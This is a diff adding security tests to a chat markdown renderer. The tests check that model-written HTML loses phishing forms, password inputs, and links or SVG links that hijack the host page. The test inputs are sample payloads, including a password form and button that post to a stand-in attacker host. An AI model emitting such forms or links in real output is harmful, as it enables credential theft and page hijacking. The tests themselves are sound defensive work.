@@ -74,6 +74,48 @@ describe('MarkdownRenderer — Links und Bilder aus dem Modelltext (Paket 10)', 
     expect(html(r.render('<img src="https://tracker.example/p.gif">'))).not.toContain('<img');
   });
 
+  // Paket 19, Audit 2026-10-31 M-12: ein Formular im Modelltext wäre ein
+  // funktionierendes Phishing-Formular im Chatfenster; Absenden navigierte die
+  // Gastseite weg. Weder Seeds noch Backend erzeugen Formularelemente.
+  it('lässt keine Formularelemente und keine Formularziele durch (M-12)', () => {
+    const r = new MarkdownRenderer(makeCtx());
+    const out = html(r.render(
+      '<form action="https://evil.example/f"><fieldset><label>PW <input name="p" type="password"></label>'
+      + '<select><option>a</option></select><textarea>t</textarea>'
+      + '<button formaction="https://evil.example/g">Los</button></fieldset></form>',
+    ));
+    for (const tag of ['<form', '<input', '<button', '<select', '<option', '<textarea', '<fieldset', '<label']) {
+      expect(out).not.toContain(tag);
+    }
+    expect(out).not.toContain('evil.example');
+  });
+
+  // N-35: `target` aus dem Modelltext blieb stehen — `_top`/`_self` navigierte die
+  // Gastseite weg. Bei nicht vertrauten Hosts gilt immer `_blank`.
+  it('überschreibt ein mitgeliefertes target bei fremden Hosts mit _blank (N-35)', () => {
+    const r = new MarkdownRenderer(makeCtx());
+    for (const ziel of ['_top', '_self', '_parent', 'benannt']) {
+      const out = html(r.render(`<a href="https://fremd.example/x" target="${ziel}">x</a>`));
+      const a = new DOMParser().parseFromString(out, 'text/html').querySelector('a')!;
+      expect(a.getAttribute('target')).toBe('_blank');
+      expect(a.getAttribute('rel')).toBe('noopener noreferrer');
+    }
+  });
+
+  // Review zu N-35: das SVG-Profil ließ `<a xlink:href=… target="_top">` durch, und
+  // die Nachbearbeitung las nur `href`.
+  it('SVG-Links: kein xlink:href, und ein fremdes Ziel bekommt _blank (N-35)', () => {
+    const r = new MarkdownRenderer(makeCtx());
+    const xlink = html(r.render(
+      '<svg><a xlink:href="https://evil.example/x" target="_top"><text>x</text></a></svg>'));
+    expect(xlink).not.toContain('evil.example');
+    expect(xlink).not.toContain('_top');
+    const svgHref = html(r.render(
+      '<svg><a href="https://evil.example/y" target="_top"><text>y</text></a></svg>'));
+    expect(svgHref).not.toContain('_top');
+    if (svgHref.includes('evil.example')) expect(svgHref).toContain('_blank');
+  });
+
   it('lässt auch kein SVG-Bild, keine Medien und keine Stile mit Adresse durch', () => {
     const r = new MarkdownRenderer(makeCtx());
     const svg = html(r.render('<svg><image href="https://tracker.example/s.svg"/></svg>'));
